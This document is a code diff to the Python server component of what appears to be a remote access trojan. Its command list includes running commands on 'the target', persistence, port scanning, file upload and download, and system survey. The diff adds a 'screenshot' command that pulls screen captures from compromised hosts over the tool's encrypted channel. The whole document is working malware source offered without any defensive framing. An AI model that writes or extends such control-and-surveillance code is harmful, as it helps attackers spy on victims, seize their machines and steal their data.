@@ -42,13 +42,13 @@ quit                - Exit the server and end all client connections.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
 scan <ip>           - Scan top 25 ports on a single host.
+screenshot <ip>     - Take a screenshot of the target host
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
-             'quit', 'rekey', 'run', 'scan', 'survey', 'unzip', 'upload',
-             'wget' ]
+             'quit', 'rekey', 'run', 'scan', 'screenshot', 'survey', 'unzip', 'upload', 'wget' ]
 
 
 class Server(threading.Thread):
@@ -130,11 +130,16 @@ class ClientConnection(threading.Thread):
                 fname = fname.strip()
                 filesock.sendfile(self.conn, fname, self.dh_key)
 
+        # take screenshot
+        elif cmd == 'screenshot':
+            fname = 'screenshot.jpg'
+            filesock.recvfile(self.conn, fname, self.dh_key)
+
         # regenerate DH key
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
-        # results of survey, persistence, unzip, or wget
+        # results of scan, survey, screenshot, persistence, unzip, or wget
         elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
             recv_data = self.conn.recv(1024)
